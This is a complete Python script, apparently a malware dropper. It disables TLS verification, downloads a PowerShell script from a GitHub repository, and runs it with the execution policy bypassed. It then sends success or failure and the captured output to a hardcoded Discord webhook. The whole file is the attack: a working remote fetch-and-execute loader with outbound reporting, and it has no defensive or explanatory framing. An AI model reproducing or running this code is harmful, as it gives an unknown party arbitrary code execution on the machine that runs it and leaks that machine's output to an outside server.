import urllib.request
import subprocess
import tempfile
import os
import json
import ssl

WEBHOOK_URL = 'https://discord.com/api/webhooks/1421777351263522886/5bDMcVkeMYaC16qHofB8ucS0qX9t_IyaBkCz9Q0tjZGJypVmzG-2lAj7q7QOgFLnI7AD'
SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'

ssl._create_default_https_context = ssl._create_unverified_context

def send_discord_notification(message, color=0x00FF00):
    payload = json.dumps({'embeds': [{'description': message, 'color': color}]})
    headers = {'Content-Type': 'application/json'}
    req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
    try:
        urllib.request.urlopen(req)
    except:
        pass

try:
    with urllib.request.urlopen(SCRIPT_URL) as response:
        script_content = response.read()
except:
    send_discord_notification('Failed to download script', 0xFF0000)
    exit(1)

with tempfile.NamedTemporaryFile(delete=False, suffix='.ps1') as temp_file:
    temp_file.write(script_content)
    temp_file_path = temp_file.name

try:
    result = subprocess.run(
        ['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_file_path],
        capture_output=True,
        text=True
    )
    if result.returncode == 0:
        send_discord_notification('Script executed successfully\n' + result.stdout, 0x00FF00)
    else:
        send_discord_notification('Script failed\n' + result.stderr, 0xFF0000)
finally:
    os.unlink(temp_file_path)
